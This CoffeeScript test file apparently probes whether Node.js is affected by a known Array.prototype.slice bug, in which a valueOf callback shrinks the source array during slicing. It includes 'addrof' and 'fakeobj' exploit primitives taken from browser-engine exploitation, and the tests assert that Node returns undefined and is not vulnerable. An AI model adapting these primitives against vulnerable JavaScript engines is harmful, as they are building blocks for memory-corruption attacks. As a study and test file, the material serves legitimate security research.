require 'fluentnode'
describe 'Test-Array-Slice.coffee', ->

  it 'check type conversions, using Math.abs', ->
    Math.abs(-42     ).assert_Is 42;        # argument is a number
    Math.abs("-42"   ).assert_Is 42         # argument is a string
    Math.abs([]      ).assert_Is 0;         # argument is an empty array
    Math.abs(true    ).assert_Is 1;         # argument is a boolean
    Math.abs({}).str().assert_Is 'NaN'      # argument is an object

  it 'using valueOf to set the value', ->
    payload =
      valueOf: ()-> return -42              # object with valueOf function that returns 42
      another: 'property'                   # extra properties
      which  : 'are ignored'                # are ignored
    Math.abs(payload).assert_Is 42          # Math.abs will use the value of valueOf from that object

  it 'exploiting slice (starting at index 0)', ->
    a = []
    for i in [0...100]
      a.push(i + 0.123)

    a.size().assert_Is 100
    b = a.slice 0, valueOf: ()-> a.length = 0; return 6;

    console.log b
    b.str().assert_Is ',,,,,'                             # in JavaScriptCode b value would be
    b.assert_Is []                                        # b = [0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0]

    assert_Is_Undefined b[0]                              # interestingly both these indexes are undefined
    assert_Is_Undefined b[9]                              # but b value (as a string) was ',,,,,'
    a.size().assert_Is 0
    b.size().assert_Is 6

  it 'exploiting slice (starting at index 1)', ->
    a = []
    for i in [0...100]
      a.push(i + 0.123);

    b = a.slice 0, valueOf: ()-> a.length = 1; return 6;
    console.log b
    b.str().assert_Is '0.123,,,,,'
    b.assert_Is [ 0.123 ]                                   # looks like node does not leak memory the way

  it 'confirming original array can be changed slide and valueOf inside length object', ->
    a1 = []
    a2 = []
    for i in [0...100]
      a1.push(i + 0.123);
      a2.push(i + 0.123);

    b1 = a1.slice 0, valueOf: ()-> a1.length = 0; return 6  # set's length value of slice to 6 and clears original array
    b2 = a2.slice 0, 6                                      # normal slide behaviour

    b1.size().assert_Is 6                                   # b1 has 6 values (as expected)
    a1.size().assert_Is 0                                   # a1 is now cleared

    b2.size().assert_Is 6                                   # b2 has 6 values (as expected)
    a2.size().assert_Is 100                                 # a2 is still intact


  it 'addrof(object) - not vulnerable in node', ->
    addrof = (object)->
      a = [];
      for i in [0...100]
        a.push(i + 0.1337);   # Array must be of type ArrayWithDoubles

      hax = valueOf: ()->
        a.length = 0;
        a = [object];
        return 4;

      b = a.slice(0, hax);
      #return Int64.fromDouble(b[3]);  # this method doesn't seem to exist in nodejs
      b.str().assert_Is ',,,'
      return b[3]

    obj = some : 'value'

    assert_Is_Undefined addrof obj

  it 'fakeobj - not vulnerable in node', ->
    fakeobj = (addr) ->                        # created with http://js2.coffee/
      a = []
      i = 0
      while i < 100
        a.push {}                              # Array must be of type ArrayWithContiguous
        i++

      #addr = addr.asDouble()
      hax = valueOf: ->
        a.length = 0
        a = [ addr ]
        4
      a.slice(0, hax)[3]

    obj = some : 'value'

    assert_Is_Undefined  console.log fakeobj obj
